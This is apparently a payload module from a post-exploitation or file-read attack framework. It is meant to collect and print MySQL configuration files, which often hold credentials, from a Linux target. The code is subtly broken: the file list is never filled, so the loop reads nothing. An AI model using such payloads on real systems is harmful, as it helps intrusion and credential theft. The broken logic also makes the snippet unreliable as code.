#REQUIRE_LINUX
#This payload shows MySQL configuration files.
result = []
files = []

directory = run_payload('mysql_config_directory')
for file in files:
    if read(file) != '':
        result.append('-------------------------')
        result.append('FILE => '+file)
        result.append(read(file))

result = [p for p in result if p != '']
